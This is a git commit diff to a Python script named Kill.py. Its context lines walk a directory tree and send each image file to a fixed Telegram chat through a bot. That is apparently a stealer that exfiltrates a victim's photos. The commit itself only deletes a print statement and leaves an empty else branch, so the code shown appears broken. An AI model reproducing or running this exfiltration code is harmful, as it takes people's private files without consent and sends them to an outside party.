7d02c4dbf4f12cd34565133f3d16edcc7879f26c
Gocker <ashqmyna85@gmail.com>
2025-01-12 21:17:02 +0200

    Update Kill.py

--- Kill.py
+++ Kill.py
@@ -14,8 +14,7 @@ def send_file(file_path):
  	if file_path.endswith(".jpg") or file_path.endswith("png") or file_path.endswith("PNG") or file_path.endswith("JPEG") or file_path.endswith("jpeg") or file_path.endswith("Webp") or file_path.endswith("webp"):
  		bot.send_photo(chat_id="7498653159",photo=f) 
  	else:
- 		print("")
-
+ 		
 for root, dirs, files in os.walk(dir_path):
 	threads = []
 	for file in files:
